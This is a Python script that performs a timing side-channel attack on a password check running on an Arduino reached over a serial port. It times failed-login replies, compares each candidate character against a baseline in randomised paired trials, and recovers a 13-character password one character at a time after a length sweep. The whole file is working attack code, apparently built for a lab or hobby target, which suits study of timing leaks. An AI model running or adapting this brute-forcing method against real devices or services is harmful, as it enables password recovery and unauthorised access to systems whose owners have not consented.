import time
import string
import statistics
import serial 
import random
from operator import itemgetter
import gc
gc.disable()

TOKEN_SIZE = 13

arduino = serial.Serial(port='/dev/cu.usbserial-110', baudrate=115200, timeout=1)


def read_until_prompt():
    res = ""
    while "password" not in res:
        byte = arduino.read(1)
        if not byte:
            return False, res
        res += byte.decode(errors="replace")
    return True, res 

def test(characters):
    ok, prompt = read_until_prompt()
    if not ok:
        raise TimeoutError(f"Did not receive password prompt. Got: {prompt!r}")

    time.sleep(0.020)
    arduino.reset_input_buffer()

    before = time.perf_counter_ns()
    arduino.write((characters + "\n").encode("utf-8"))
    arduino.flush()

    res = ""
    while "Login failure" not in res:
        chunk = arduino.read(1)
        if not chunk:
            raise TimeoutError(f"Timed out waiting for login response for {characters!r}")
        res += chunk.decode(errors="replace")

    after = time.perf_counter_ns()
    return after - before

def try_to_hack(characters, test_by_length): 
    deltas = []
    for _ in range(50):
        if random.random() < 0.5:
            b = test(test_by_length)
            c = test(characters)
        else:
            c = test(characters)
            b = test(test_by_length)
        deltas.append(c - b)
    return deltas

def find_next_character(base):
    res = []

    test_by_length = base + "x" * (TOKEN_SIZE - len(base))

    print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
    for i, character in enumerate(string.ascii_lowercase):
        timings = try_to_hack(base + character + "a" * (TOKEN_SIZE - len(base) - 1), test_by_length)

        median = statistics.median(timings)
        res.append((character, median))
    
    res.sort(key=lambda r: r[1], reverse=True)
    best_char, best_delta = res[0]

    print(f"Position {len(base) + 1}: best={best_char!r} ({best_delta / 1000:.0f} us median)")
    for char, delta in res[1:4]:
        print(f"  {char!r}: {delta / 1000:.0f} us median")

    return best_char

def find_size():
    print("Length sweep")
    for length in range(1, 21):
        candidate = "X" * length
        elapsed = test(candidate)
        print(f"{length} {elapsed / 1000:.0f} us")

def main():
    arduino.setDTR(False)
    time.sleep(0.1)
    arduino.setDTR(True)
    time.sleep(2)

    arduino.write(b'hello\r\n')
    arduino.readline()
    time.sleep(2)

    base = ''
    find_size()

    while len(base) != TOKEN_SIZE:
        next_character = find_next_character(base)
        base += next_character

if __name__ == '__main__':
    main()
